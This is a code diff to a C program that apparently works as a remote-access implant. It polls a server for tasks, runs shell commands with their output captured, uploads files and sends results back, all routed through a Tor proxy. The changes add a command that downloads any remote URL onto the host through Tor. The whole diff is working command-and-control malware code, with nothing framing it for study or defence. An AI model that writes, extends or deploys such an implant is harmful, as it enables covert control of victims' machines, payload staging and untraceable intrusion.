@@ -45,6 +45,7 @@ char* fileToString(char* file_name)
     fclose(file);
     return buffer;
 }
+
 char* get_command(char* todo)
 {
     char *todo_temp = malloc(BUFFER_SIZE);
@@ -128,6 +129,13 @@ WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
   mem->memory[mem->size] = 0;
   return realsize;
 }
+
+static size_t write_data(void *ptr, size_t size, size_t nmemb, void *stream)
+{
+  size_t written = fwrite(ptr, size, nmemb, (FILE *)stream);
+  return written;
+}
+
 char* get_request(char *path)
 {
     CURL *curl;
@@ -296,6 +304,37 @@ char* upload_request(char *path, char *filename)
     }
     return 0;
 }
+bool download_request(char* url, char* destination)
+{
+    CURL *curl;
+    CURLcode res;
+    char *pagefilename = destination;
+    FILE *pagefile;
+    curl_global_init(CURL_GLOBAL_ALL);
+    curl = curl_easy_init();
+    curl_easy_setopt(curl, CURLOPT_PROXY, URL_TOR);
+    curl_easy_setopt(curl, CURLOPT_URL, url);
+    curl_easy_setopt(curl, CURLOPT_NOPROGRESS, 1L);
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
+    pagefile = fopen(pagefilename, "wb");
+    if(pagefile)
+    {
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, pagefile);
+        res = curl_easy_perform(curl);
+        fclose(pagefile);
+        if(res != CURLE_OK)
+        {
+            failed_request(curl_easy_strerror(res));
+            curl_easy_cleanup(curl);
+            curl_global_cleanup();
+            return false;
+        }
+		}
+    curl_easy_cleanup(curl);
+    curl_global_cleanup();
+    return true;
+}
+
 
 /* ----------------------------------------------------------------------- *
 *  Action Threads
@@ -330,7 +369,17 @@ char* say_hello()
 
 void* download(void* input)
 {
-    printf("%s", input);
+    char *arg1, *arg2;
+    char *token = strtok(input, " ");
+    arg1 = token;
+    token = strtok(NULL, " ");
+    arg2 = token;
+    send_output("[*] Downloading ...",true);
+    bool success = download_request(arg1, arg2);
+    if(success)
+        send_output("[+] File downloaded",true);
+    else
+        send_output("[!] File download failed",true);
     pthread_exit(NULL);
 }
 
@@ -358,7 +407,6 @@ void* do_command(void* input)
     char* instruction = " 2>&1";
     char* command = malloc(strlen(input) + strlen(instruction) + BUFFER_SIZE);
     sprintf(command, "%s %s",input, instruction);
-    printf("%s\n",command);
     char buffer[BUFFER_SIZE*2];
     size_t buffer_size = BUFFER_SIZE*2;
     char *output = malloc(BUFFER_SIZE*2);
@@ -432,6 +480,7 @@ void run()
         todo = say_hello();
         if(!(todo!= NULL && todo[0] == '\0'))
         {
+            printf("%s\n",todo);
             IDLE = false;
             TIME_LAST_ACTIVE = get_time();
             sprintf(output,"$ %s",todo);
@@ -455,7 +504,7 @@ void run()
             }
             else if(strcmp("download",command) == 0)
             {
-                if(args_len == 0)
+                if(args_len != 2)
                     send_output("Usage: download <remote_url> <destination>",true);
                 else
                     pthread_create(&tid, NULL, download, get_args(todo));
